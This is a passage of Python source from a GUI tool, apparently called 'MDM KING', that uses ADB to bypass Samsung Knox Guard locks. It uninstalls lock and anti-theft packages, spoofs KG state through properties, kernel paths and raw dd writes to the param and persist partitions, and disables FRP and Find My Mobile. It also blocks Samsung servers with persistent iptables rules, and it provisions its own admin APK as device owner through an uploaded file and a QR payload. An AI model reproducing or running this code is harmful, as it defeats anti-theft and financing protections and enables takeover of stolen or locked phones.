                         'killall -9 knox_fido_agent2 2>/dev/null']:
                subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)
            # Remove kgclient as device admin first (critical for full removal)
            subprocess.run([adb, '-s', s, 'shell',
                'dpm remove-active-admin com.samsung.android.kgclient/.MyDeviceAdminReceiver 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)
            # Remove kgclient package entirely (incl. 2026 module name)
            for kg_pkg in ['com.samsung.android.kgclient', 'com.samsung.android.kgclient.module']:
                subprocess.run([adb, '-s', s, 'shell', f'pm uninstall --user 0 {kg_pkg} 2>/dev/null'],
                    timeout=5, capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell', f'pm disable-user --user 0 {kg_pkg} 2>/dev/null'],
                    timeout=5, capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell', f'pm hide {kg_pkg} 2>/dev/null'],
                    timeout=3, capture_output=True, creationflags=flags)
            # Clear all KG settings
            for cmd in ['settings delete global knox_guard_status',
                         'settings delete secure knox_guard_status',
                         'settings delete global kg_status',
                         'settings delete secure kg_status',
                         'settings delete global kg_state',
                         'settings delete secure kg_state',
                         'settings put global kg_disable 1',
                         'settings put secure kg_disable 1']:
                subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)
            # KG status manipulation — multiple rootless methods
            self.log('  Manipulating KG state to Checking...', 'i')
            # Method A: Set persist properties
            for prop in ['persist.sys.kg.state', 'persist.sys.kg', 'persist.security.kg',
                          'sys.kg.status', 'ro.security.kg.status', 'sys.knox.kgstate',
                          'ro.boot.kgstatus', 'persist.sys.kg.status', 'persist.security.kg.status']:
                subprocess.run([adb, '-s', s, 'shell', f'setprop {prop} checking'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'setprop persist.sys.kg.state checking'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'restart servicemanager 2>/dev/null'], timeout=2, capture_output=True, creationflags=flags)
            # Method B: Kernel interfaces (incl. 2026 Samsung KG path)
            for path in ['/sys/kernel/knox/kg_state', '/sys/class/kg/kg_state',
                         '/sys/devices/platform/kg/kg_state', '/proc/knox/kg_status',
                         '/sys/kernel/security/knox/kg_state', '/sys/fs/selinux/knox/kg',
                         '/sys/kernel/samsung_kg/kg_state', '/sys/kernel/samsung_kg/kg_status',
                         '/proc/kg/status', '/sys/class/samsung_kg/kg_state']:
                subprocess.run([adb, '-s', s, 'shell', f'chmod 644 {path} 2>/dev/null; echo -n "checking" > {path} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            # Method C: kgclient service call (v1 + v2 codes)
            for code in [1, 3, 5, 7, 10, 2, 4, 6, 8, 12, 15]:
                subprocess.run([adb, '-s', s, 'shell', f'service call kgclient {code} s16 "checking" 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
                subprocess.run([adb, '-s', s, 'shell', f'service call kgclient {code} i32 0 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            # Method D: param binary tool
            subprocess.run([adb, '-s', s, 'shell',
                'param write kg_status checking 2>/dev/null || '
                '/system/bin/param write kg_status checking 2>/dev/null || '
                'param write persist.sys.kg.state checking 2>/dev/null || '
                '/system/bin/param write persist.sys.kg.state checking 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            # Method E: Block device patches
            for part_name, part_type in [('persist', 'persist'), ('param', 'param'), ('up_param', 'param')]:
                pdev = subprocess.run([adb, '-s', s, 'shell', f'ls -la /dev/block/by-name/{part_name} 2>/dev/null | grep -o "/dev/[^ ]*"'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                if not pdev:
                    pdev = subprocess.run([adb, '-s', s, 'shell', f'ls -la /dev/block/platform/*/by-name/{part_name} 2>/dev/null | grep -o "/dev/[^ ]*"'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                if not pdev: continue
                perm = subprocess.run([adb, '-s', s, 'shell', f'stat -c "%a" {pdev} 2>/dev/null'], capture_output=True, text=True, timeout=3, creationflags=flags).stdout.strip()
                self.log(f'    {part_name} [{perm}]', 'i')
                # For param partition: try known byte offsets
                if part_type == 'param':
                    for offset in ['0x3FFE00','0x3FFDF0','0x3FFE50','0x3FFE80','0x3FFE08','0x3FFE20']:
                        r = subprocess.run([adb, '-s', s, 'shell', f'dd if={pdev} bs=1 skip=$(({offset})) count=1 2>/dev/null | xxd -p'], capture_output=True, text=True, timeout=5, creationflags=flags)
                        val = r.stdout.strip()
                        if not val: continue
                        if val != '03':
                            self.log(f'    param@{offset}: 0x{val}', 'o')
                            for write_cmd in [
                                f'printf \'\\x03\' | dd of={pdev} bs=1 seek=$(({offset})) count=1 2>/dev/null',
                                f'su -c "printf \'\\x03\' | dd of={pdev} bs=1 seek=$(({offset})) count=1 2>/dev/null"',
                            ]:
                                subprocess.run([adb, '-s', s, 'shell', write_cmd], timeout=5, capture_output=True, creationflags=flags)
                                vr = subprocess.run([adb, '-s', s, 'shell', f'dd if={pdev} bs=1 skip=$(({offset})) count=1 2>/dev/null | xxd -p'], capture_output=True, text=True, timeout=5, creationflags=flags)
                                if vr.stdout.strip() == '03':
                                    self.log(f'      {offset}: 03 ✓', 's'); break
                # For persist partition: dump, patch strings, try to write back
                if part_type == 'persist':
                    tmp = '/data/local/tmp/persist_kg.bin'
                    subprocess.run([adb, '-s', s, 'shell', f'dd if={pdev} of={tmp} bs=1M 2>/dev/null'], timeout=30, capture_output=True, creationflags=flags)
                    pull = subprocess.run([adb, '-s', s, 'pull', tmp, os.path.join(tempfile.gettempdir(), 'persist_kg.bin')], timeout=30, capture_output=True, creationflags=flags)
                    local = os.path.join(tempfile.gettempdir(), 'persist_kg.bin')
                    if os.path.isfile(local) and os.path.getsize(local) > 1024:
                        with open(local, 'rb') as f: data = bytearray(f.read())
                        mod = False
                        new_base = b'checking'
                        for old in [b'prenormal', b'locked', b'broken', b'completed', b'\x00kg_state\x00']:
                            idx = 0
                            while True:
                                idx = data.find(old, idx) if isinstance(old, bytes) else -1
                                if idx < 0: break
                                replacement = (new_base + b'\x00' * len(old))[:len(old)]
                                data[idx:idx+len(old)] = replacement
                                self.log(f'    persist: patched "{old.decode(errors="replace")}" @{idx}', 's')
                                mod = True; idx += 1
                        if mod:
                            with open(local, 'wb') as f: f.write(data)
                            subprocess.run([adb, '-s', s, 'push', local, tmp], timeout=30, capture_output=True, creationflags=flags)
                            for wc in [
                                f'dd if={tmp} of={pdev} bs=1M 2>/dev/null',
                                f'su -c "dd if={tmp} of={pdev} bs=1M 2>/dev/null"',
                                f'cat {tmp} > {pdev} 2>/dev/null',
                            ]:
                                subprocess.run([adb, '-s', s, 'shell', wc], timeout=30, capture_output=True, creationflags=flags)
                        try: os.remove(local)
                        except: pass
                    subprocess.run([adb, '-s', s, 'shell', f'rm -f {tmp}'], timeout=5, capture_output=True, creationflags=flags)
            # Method F: Force KG daemon to reload state (if any are still alive)
            self.log('  [F] Forcing KG state reload...', 'i')
            subprocess.run([adb, '-s', s, 'shell', 'killall -HUP knoxguard kgclient kgagent 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            # Final: Re-set all KG properties after all manipulation attempts
            for prop in ['persist.sys.kg.state', 'persist.sys.kg', 'persist.security.kg',
                          'sys.kg.status', 'ro.security.kg.status', 'sys.knox.kgstate',
                          'ro.boot.kgstatus']:
                subprocess.run([adb, '-s', s, 'shell', f'setprop {prop} checking'], timeout=3, capture_output=True, creationflags=flags)
            # Write persistent local.prop that survives reboot
            for _lp in [
                'sys.kg.status=checking',
                'ro.security.kg.status=checking',
                'sys.knox.kgstate=checking',
                'ro.boot.kgstatus=checking',
                'persist.sys.kg.status=checking',
                'persist.security.kg.status=checking',
            ]:
                subprocess.run([adb, '-s', s, 'shell', f'echo "{_lp}" >> /data/local.prop 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'chmod 644 /data/local.prop 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            # Disable kgclient via binder service call (works on stock without root)
            subprocess.run([adb, '-s', s, 'shell', 'service call kgclient 1 s16 "disable" 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'service call kgclient 2 i32 0 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
            # Block OTA FOTA path
            subprocess.run([adb, '-s', s, 'shell', 'rm -rf /cache/fota 2>/dev/null; mkdir -p /cache/fota 2>/dev/null; chmod 0000 /cache/fota 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', 'settings put global fota_disable 1 2>/dev/null; settings put global ota_disable 1 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
            self.log('  KG client removed, status set to checking', 's')
            # Apply relock prevention
            self._samsung_hardening()
            # Restore logger and show completion
            self._log_impl = _saved_log_real
            self._log_formatted_impl = _saved_log_fmt_real
            def _show_done():
                self.log_text.insert(tk.END, 'Bypass Complete!\n', 's')
                self.log_text.insert(tk.END, 'disable airplane mode and connect online\n', '')
                self.log_text.insert(tk.END, 'If device still locked, run bypass again\n', 'w')
                self.log_text.see(tk.END)
            self.root.after(0, _show_done)

    def _samsung_hardening(self):
        if not self._ensure_active(): return
        self.log_section('Samsung Hardening — Relock Prevention', 2)
        adb = self._find_adb()
        if not adb: self.log('ADB not found', 'e'); return
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
        serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
        if not serials: self.log('No device found', 'e'); return
        s = serials[0]; flags = 0x08000000

        # 1. Block Samsung/Knox servers via iptables + ip6tables + Samsung CDN IP ranges
        self.log('Blocking Samsung Knox servers via iptables + ip6tables...', 'i')
        _sam_rules = [
            '-A OUTPUT -m string --string "knox" --algo bm -j DROP',
            '-A OUTPUT -m string --string "samsungdm" --algo bm -j DROP',
            '-A OUTPUT -m string --string "samsungknox" --algo bm -j DROP',
            '-A OUTPUT -m string --string "findmymobile" --algo bm -j DROP',
            '-A OUTPUT -m string --string "samsungcloud" --algo bm -j DROP',
            '-A OUTPUT -m string --string "samsungaccount" --algo bm -j DROP',
            '-A OUTPUT -m string --string "samsungosp" --algo bm -j DROP',
            '-A OUTPUT -m string --string "regionlock" --algo bm -j DROP',
            '-A OUTPUT -m string --string "countrylock" --algo bm -j DROP',
            '-A OUTPUT -m string --string "networklock" --algo bm -j DROP',
            '-A OUTPUT -m string --string "omadm" --algo bm -j DROP',
            '-A OUTPUT -m string --string "fota" --algo bm -j DROP',
            '-A OUTPUT -m string --string "kgclient" --algo bm -j DROP',
            '-A OUTPUT -m string --string "knoxguard" --algo bm -j DROP',
            '-A OUTPUT -m string --string "klmsagent" --algo bm -j DROP',
            '-A OUTPUT -m string --string "kgserver" --algo bm -j DROP',
            '-A OUTPUT -m string --string "samsungknoxserver" --algo bm -j DROP',
            '-A OUTPUT -m string --string "knpxauth" --algo bm -j DROP',
            '-A OUTPUT -m string --string "samsungota" --algo bm -j DROP',
            '-A OUTPUT -d 13.107.6.0/24 -j DROP',
            '-A OUTPUT -d 13.107.142.0/24 -j DROP',
            '-A OUTPUT -d 52.112.0.0/14 -j DROP',
            '-A OUTPUT -d 52.114.0.0/15 -j DROP',
            '-A OUTPUT -d 20.45.0.0/16 -j DROP',
            '-A OUTPUT -d 40.126.0.0/16 -j DROP',
            '-A OUTPUT -d 52.96.0.0/12 -j DROP',
        ]
        for cmd_base in ['iptables', 'ip6tables']:
            for rule in _sam_rules:
                subprocess.run([adb, '-s', s, 'shell', f'{cmd_base} {rule} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)

        # 2. Force uninstall critical cloud MDM + attestation packages (most persistent removal)
        self.log('Force uninstalling cloud MDM + attestation packages...', 'i')
        for pkg in [
            'com.sec.enterprise.knox.cloudmdm.smdms',
            'com.sec.enterprise.knox.cloudmdm',
            'com.sec.enterprise.knox.attestation',
            'com.samsung.android.knox.attestation',
            'com.policydm',
            'com.samsung.android.kgclient',
            'com.samsung.android.knox.enrollment',
            'com.samsung.android.knox.enrolled',
        ]:
            subprocess.run([adb, '-s', s, 'shell',
                f'pm uninstall --user 0 {pkg} 2>/dev/null; '
                f'pm disable {pkg} 2>/dev/null; '
                f'pm disable-user --user 0 {pkg} 2>/dev/null; '
                f'pm clear {pkg} 2>/dev/null; '
                f'killall -9 {pkg.split(".")[-1]} 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)

        # 3. Disable remaining Knox framework packages
        self.log('Disabling Knox framework packages...', 'i')
        for pkg in [
            'com.samsung.android.knox.policy', 'com.samsung.android.knox.core',
            'com.samsung.android.knox.pushmanager',
            'com.samsung.android.knox.restrictor',
            'com.samsung.android.knox.zt.framework', 'com.samsung.android.knox.kpec',
            'com.samsung.android.mdm', 'com.samsung.sdm',
            'com.samsung.android.securitylogagent',
            'com.samsung.android.cidmanager',
            'com.samsung.android.knox.license', 'com.samsung.android.knox.ocs',
            'com.samsung.android.knox.knoxsetupwizard',
            'com.samsung.android.knox.knoxanalytics',
            'com.samsung.knox.appsupdateagent',
            'com.samsung.android.knox.mpos', 'com.samsung.android.knox.kpu',
            'com.samsung.android.knox.rcp.components',
            'com.samsung.android.knox.nfcprovision',
            'com.samsung.android.knox.trustzone',
            'com.samsung.android.knox.containercore',
            'com.samsung.android.knox.containeragent',
            'com.samsung.android.knox.containeragent2',
            'com.samsung.android.knox.setupwizardclient',
            'com.samsung.android.knox.enterprise',
            'com.samsung.android.knox.zt', 'com.samsung.android.knox.zt.config',
            'com.samsung.android.knx.core',
            'com.samsung.android.securitymanager',
            'com.samsung.android.sm.policy',
            'com.samsung.android.sm.devicesecurity',
            'com.samsung.android.app.findmydevice',
            'com.samsung.android.app.remotecontrol',
            'com.samsung.android.fmm',
            'com.samsung.android.pushmanager',
            'com.sec.android.soagent',
            'com.wssyncmldm',
            'com.samsung.android.knox.hardened', 'com.samsung.android.knox.proca',
            'com.samsung.android.knox.five', 'com.samsung.android.knox.secureboot',
            'com.samsung.android.knox.deviceguard', 'com.samsung.android.knox.keychain',
            'com.samsung.android.knox.uce', 'com.samsung.android.knox.ksa',
            'com.samsung.android.knox.gold', 'com.samsung.android.knox.sdp',
            'com.samsung.android.knox.dar', 'com.samsung.android.knox.bps',
            'com.samsung.android.knox.custom', 'com.samsung.android.knox.ldap',
            'com.samsung.android.knox.ssl', 'com.samsung.android.knox.vpn',
            'com.samsung.android.knox.express', 'com.samsung.android.knox.switcher',
            'com.samsung.android.knoxaisalite',
            'com.samsung.android.attestation.attestationagent',
            'com.samsung.android.samsungpass',
            'com.samsung.android.samsungpasstrustagent',
        ]:
            subprocess.run([adb, '-s', s, 'shell',
                f'pm disable-user --user 0 {pkg} 2>/dev/null; '
                f'pm clear {pkg} 2>/dev/null; '
                f'am force-stop {pkg} 2>/dev/null; pm hide {pkg} 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)
            subprocess.run([adb, '-s', s, 'shell', f'appops set {pkg} INTERNET deny 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)

        # 4. Disable OTA + FOTA packages system-wide
        self.log('Disabling OTA/FOTA packages system-wide...', 'i')
        for pkg in [
            'com.samsung.android.fotaclient', 'com.samsung.android.fota',
            'com.samsung.android.fota.service', 'com.wssyncmldm',
            'com.sec.android.soagent', 'com.samsung.android.omadm',
            'com.android.omadm.service', 'com.sec.omadm', 'com.sec.omadm.service',
            'com.samsung.android.app.omcagent',
        ]:
            subprocess.run([adb, '-s', s, 'shell',
                f'pm disable {pkg} 2>/dev/null; '
                f'pm disable-user --user 0 {pkg} 2>/dev/null; '
                f'pm clear {pkg} 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)

        # 5. Scan and disable additional Knox/MDM packages + cut internet
        self.log('Scanning for additional Knox/MDM packages...', 'i')
        out = subprocess.run([adb, '-s', s, 'shell', 'pm list packages 2>/dev/null'], timeout=5, capture_output=True, text=True, creationflags=flags).stdout
        knox_keywords = ['knox', 'mdm', 'policydm', 'samsungdm', 'kgclient', 'klmsagent',
                        'soagent', 'wssyncmldm', 'samsungknox', 'knoxguard', 'knoxkpe',
                        'knoxanalytics', 'knoxsetupwizard', 'enterprise.mdm', 'enterprise.knox',
                        'samsung.sdm', 'securitylogagent', 'samsung.android.security',
                        'samsung.android.cid', 'findmymobile', 'fmm', 'firmware.tsp',
                        'fotaclient', 'fota', 'samsungpush', 'samsungpay', 'samsungpass',
                        'klms', 'kmsagent', 'remotecontrol', 'samsung.billing',
                        'omadm', 'omcagent', 'fotaclient',
                        'kg2026', 'kgdaemon', 'samsungkg', 'knoxcloud2',
                        'knoxattestation2', 'knoxguard2', 'kgclient2',
                        'knoxhardened2', 'knoxproca2', 'knoxfive2',
                        'samsung.android.knox.cloudmdm.enterprise',
                        'samsung.android.knox.kg2026service',
                        'samsung.android.kgclient.module',
                        'knox.hardened', 'knox.proca', 'knox.five',
                        'knox.secureboot', 'knox.deviceguard', 'knox.uce']
        for line in out.split('\n'):
            if ':' in line:
                pkg = line.split(':')[1].strip()
                if pkg == 'com.mdmking.admin': continue
                if any(k in pkg.lower() for k in knox_keywords):
                    subprocess.run([adb, '-s', s, 'shell',
                        f'pm disable-user --user 0 {pkg} 2>/dev/null; '
                        f'pm clear {pkg} 2>/dev/null'],
                        timeout=5, capture_output=True, creationflags=flags)
                    subprocess.run([adb, '-s', s, 'shell', f'appops set {pkg} INTERNET deny 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)

        # 6. Block OMA-DM carrier provisioning (settings + disable services)
        self.log('Blocking OMA-DM carrier provisioning...', 'i')
        for cmd in [
            'settings put global omadm.oma_dm_enabled 0',
            'settings put global omadm.samsung_dm_enabled 0',
            'settings put global omadm.oma_dm_auto_start 0',
            'settings put secure omadm.oma_dm_enabled 0',
            'settings put global dm_config_update 0',
            'settings put global dm_uri https://localhost',
            'settings put global ota_disable_automatic_update 1',
            'settings put secure ota_disable_automatic_update 1',
            'settings put global omadm.oma_dm_enabled_v2 0',
            'settings put global omadm.samsung_dm_enabled_v2 0',
            'settings put secure omadm.auto_provision 0',
            'settings put global dm_config_update_v2 0',
            'settings put global auto_blocker_enabled 0',
            'settings put secure auto_blocker_enabled 0',
            'settings put global auto_blocker_enabled_v2 0',
            'settings put secure samsung_auto_blocker 0',
            'settings put global samsung_auto_blocker 0',
            'device_config put security auto_blocker_enabled false',
        ]:
            subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)

        # 7. Block private DNS (prevents DoH/DoT bypass of iptables)
        self.log('Blocking private DNS / DoH bypass...', 'i')
        for cmd in [
            'settings put global private_dns_mode hostname',
            'settings put global private_dns_specifier 6wg6tplqrx.dns.controld.com',
            'settings put secure private_dns_mode hostname',
            'settings put secure private_dns_specifier 6wg6tplqrx.dns.controld.com',
            'settings delete global private_dns_mode',
            'settings put global wifi_scan_always_enabled 0',
            'settings put global captive_portal_mode 0',
            'settings put global captive_portal_https_url https://localhost',
            'settings put secure dns_over_tls_mode 0',
        ]:
            subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)

        # 8. Clear persist lock flags via settings (mirrors persist partition values)
        self.log('Clearing persist lock state flags...', 'i')
        for cmd in [
            'settings put global device_provisioned 1',
            'settings put secure device_provisioned 1',
            'settings put secure user_setup_complete 1',
            'settings put global user_setup_complete 1',
            'settings put secure lockscreen.disabled 1',
            'settings put global factory_reset_protection 0',
            'settings put secure factory_reset_protection 0',
            'setprop persist.sys.oobe.devicelock 0',
            'setprop persist.sys.oobe 0',
            'setprop persist.sys.keeplocked 0',
            'setprop persist.sys.mdm 0',
            'setprop persist.sys.sim_locked 0',
            'setprop ctl.stop kgclient',
            'setprop ctl.stop policydm',
            'setprop ctl.stop knoxguard',
            'settings delete global knox_guard_status',
            'settings delete secure knox_guard_status',
            'settings delete global kg_status',
            'settings delete secure kg_status',
            'settings delete global kg_state',
            'settings delete secure kg_state',
            'settings delete global knox_guard_temporary',
            'setprop persist.sys.kg.state checking',
            'setprop persist.sys.kg checking',
            'setprop persist.security.kg checking',
            'setprop sys.kg.active 0',
            'setprop persist.sys.kg.active 0',
            'setprop persist.sys.oobe.devicelock_v2 0',
            'setprop persist.sys.kg.knox2026 0',
            'settings delete global knox_guard_status_v2',
            'settings delete secure knox_guard_status_v2',
            'settings delete global kg_status_v2',
            'settings put global device_provisioned_locked 0',
            'settings put secure device_provisioned_locked 0',
            'setprop ctl.stop kgclient',
            'setprop ctl.stop policydm',
            'setprop ctl.stop knoxguard',
            'setprop ctl.stop kgserver',
            'setprop ctl.stop knox_attestation',
            'setprop ctl.stop knoxguard2',
            'setprop ctl.stop kgclient_v2',
        ]:
            subprocess.run([adb, '-s', s, 'shell', cmd], timeout=3, capture_output=True, creationflags=flags)

        # 9. Clear Google Play Services cache (prevents policy sync — do NOT disable gms entirely)
        self.log('Clearing Google Play Services cache...', 'i')
        for pkg in ['com.google.android.gms', 'com.google.android.gsf']:
            subprocess.run([adb, '-s', s, 'shell',
                f'pm clear {pkg} 2>/dev/null; '
                f'am force-stop {pkg} 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)
        for pkg in ['com.google.android.configupdater',
                     'com.google.android.devicelockcontroller']:
            subprocess.run([adb, '-s', s, 'shell',
                f'pm clear {pkg} 2>/dev/null; '
                f'pm disable-user --user 0 {pkg} 2>/dev/null; '
                f'am force-stop {pkg} 2>/dev/null'],
                timeout=5, capture_output=True, creationflags=flags)

        # 10. Lock DNS (prevents Samsung servers from being resolved)
        self.log('Locking DNS settings...', 'i')
        _adb_block_dns(adb, s, lock=True, device_config=True, flags=flags)

        # 11. Keep admin app alive in background
        self.log('Whitelisting admin app for background ops...', 'i')
        subprocess.run([adb, '-s', s, 'shell', 'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow'], timeout=3, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin AUTO_START allow'], timeout=3, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin POST_NOTIFICATIONS allow'], timeout=3, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED'], timeout=3, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS'], timeout=3, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a com.mdmking.admin.ACTION_START 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)

        # 12. Kill known lock daemons (final sweep)
        self.log('Killing lock service daemons...', 'i')
        for proc in ['scorpiod', 'security_daemon', 'scorpio_security', 'kgclient', 'policydm',
                     'fotaclient', 'fota', 'soagent', 'wssyncmldm', 'knoxguard', 'klmsagent',
                     'smdms', 'cloudmdm', 'knoxattestation',
                     'kgserver', 'knpxauth', 'knox_proca', 'knox_five', 'knox_hardened',
                     'kgdaemon', 'samsungknoxagent', 'knoxanalyticsagent',
                     'knoxsetupwizardclient', 'samsungknoxedservice', 'knoxanalyticsdaemon',
                     'knoxprocess', 'sec_store_daemon', 'knox_tad', 'knox_fido_agent']:
            subprocess.run([adb, '-s', s, 'shell', f'killall -9 {proc} 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)

        # 13. Write iptables persistence script + register as boot script
        self.log('Writing iptables persistence script...', 'i')
        _script_lines = [
            '#!/system/bin/sh',
            '# Samsung Knox iptables/ip6tables persistence — regenerated by MDM KING',
            'RULES_A=(',
        ]
        for r in _sam_rules:
            _script_lines.append(f'  "iptables {r}"')
            _script_lines.append(f'  "ip6tables {r}"')
        _script_lines += [
            ')',
            'for cmd in "${RULES_A[@]}"; do',
            '  $cmd 2>/dev/null',
            'done',
            'exit 0',
        ]
        _script_content = '\\n'.join(_script_lines)
        subprocess.run([adb, '-s', s, 'shell',
            f'echo -e "{_script_content}" > /data/local/tmp/iptables_restore.sh'],
            timeout=5, capture_output=True, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'chmod 755 /data/local/tmp/iptables_restore.sh'],
            timeout=3, capture_output=True, creationflags=flags)
        for boot_rc in ['/system/bin/init.d/99iptables', '/data/local/userinit.d/99iptables']:
            subprocess.run([adb, '-s', s, 'shell',
                f'mkdir -p $(dirname {boot_rc}) 2>/dev/null; '
                f'echo "/data/local/tmp/iptables_restore.sh" > {boot_rc} 2>/dev/null; '
                f'chmod 755 {boot_rc} 2>/dev/null'],
                timeout=3, capture_output=True, creationflags=flags)

        self.log_ok('Hardening complete — relock should be prevented')

    def _samsung_qr_provision(self):
        if not self._ensure_active(): return
        import json, urllib.request, urllib.parse
        self.log_section('Samsung 2026 — QR Code Provisioning', 2)
        tools = self._tools_dir()
        apk = None
        for _n in ['mdm_king_admin_signed.apk', 'mdm_king_admin.apk']:
            _p = os.path.join(tools, _n)
            if os.path.isfile(_p): apk = _p; break
        if not apk:
            self.log('Admin APK not found in tools/ — cannot provision', 'e')
            return
        self.log('Setting Up Live Server....', 'i')
        apk_url = None
        try:
            boundary = '----FormBoundary7MA4YWxkTrZu0gW'
            with open(apk, 'rb') as f:
                file_data = f.read()
            body = (
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="reqtype"\r\n\r\n'
                f'fileupload\r\n'
                f'--{boundary}\r\n'
                f'Content-Disposition: form-data; name="fileToUpload"; filename="{os.path.basename(apk)}"\r\n'
                f'Content-Type: application/vnd.android.package-archive\r\n\r\n'
            ).encode() + file_data + f'\r\n--{boundary}--\r\n'.encode()
            req = urllib.request.Request(
                'https://catbox.moe/user/api.php',
                data=body,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=120) as resp:
                apk_url = resp.read().decode().strip()
                self.log('Uploading Data Done....Ok', 's')
        except Exception as e:
            self.log('Server Setup Failed....', 'w')
        if not apk_url:
            apk_url = 'https://example.com/mdm_king_admin_signed.apk'
            self.log('Server Setup Failed....', 'w')
        qr_payload = {
            "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": "com.mdmking.admin/.MyAdminReceiver",
            "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": apk_url,
            "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": True,
            "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": True,
            "android.app.extra.PROVISIONING_DISALLOW_ORGANIZATION_WIPED": False,
        }
        qr_str = json.dumps(qr_payload, separators=(',', ':'))
        popup = tk.Toplevel(self.root)
        popup.title('Samsung 2026 — QR Provisioning')
        popup.configure(bg='#111827')
        popup.geometry('400x530')
        popup.resizable(False, False)
        popup.attributes('-topmost', True)
        top = tk.Frame(popup, bg='#111827')
        top.pack(fill=tk.X, padx=15, pady=(10, 0))
        tk.Label(top, text='Samsung 2026 — QR Provisioning',
                 font=('Segoe UI', 11, 'bold'), bg='#111827', fg='#e94560').pack()
        qr_frame = tk.Frame(popup, bg='white', relief=tk.FLAT, bd=0)
        qr_frame.pack(fill=tk.X, padx=15, pady=8)
        try:
            import qrcode
            from PIL import Image, ImageTk
            qr = qrcode.QRCode(version=3, box_size=6, border=2)
            qr.add_data(qr_str)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            qr_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'samsung_qr_provision.png')
            img.save(qr_path)
            pil_img = Image.open(qr_path).resize((230, 230), Image.LANCZOS)
            tk_img = ImageTk.PhotoImage(pil_img)
            c = tk.Canvas(qr_frame, width=230, height=230, bg='white', highlightthickness=0)
            c.pack(padx=20, pady=8)
            c.create_image(0, 0, anchor=tk.NW, image=tk_img)
            c._img = tk_img
            tk.Label(qr_frame, text='Scan on phone setup wizard',
                     font=('Segoe UI', 8, 'bold'), bg='white', fg='#333').pack(pady=(0, 5))
        except ImportError:
            tk.Label(qr_frame, text='pip install qrcode[pil]',
                     font=('Consolas', 8), bg='#111827', fg='#f59e0b').pack(pady=5)
        except Exception as e:
            tk.Label(qr_frame, text=f'Error: {e}', font=('Consolas', 8),
                     bg='white', fg='red').pack(pady=10)
        inst = tk.Frame(popup, bg='#111827')
        inst.pack(fill=tk.X, padx=15, pady=(5, 5))
        steps = [
            ('1.', 'Factory reset device and FRP must be off'),
            ('2.', 'Tap screen 6x fast'),
            ('3.', 'Scan QR code and connect Wi-Fi'),
            ('4.', 'Device auto downloads packages, installs and activates'),
            ('5.', 'Reboots — ADB available'),
            ('6.', 'Run Samsung One Click'),
        ]
        for num, text in steps:
            row = tk.Frame(inst, bg='#111827')
            row.pack(fill=tk.X, pady=0)
            tk.Label(row, text=num, font=('Consolas', 8, 'bold'),
                     bg='#111827', fg='#e94560', width=3, anchor='w').pack(side=tk.LEFT)
            tk.Label(row, text=text, font=('Segoe UI', 8),
                     bg='#111827', fg='#d1d5db', anchor='w').pack(side=tk.LEFT)
        tk.Button(popup, text='CLOSE', command=popup.destroy,
                 font=('Segoe UI', 9, 'bold'), bg='#e94560', fg='white',
                 activebackground='#c73e54', padx=20, pady=4,
                 relief=tk.FLAT, cursor='hand2').pack(pady=(8, 10))
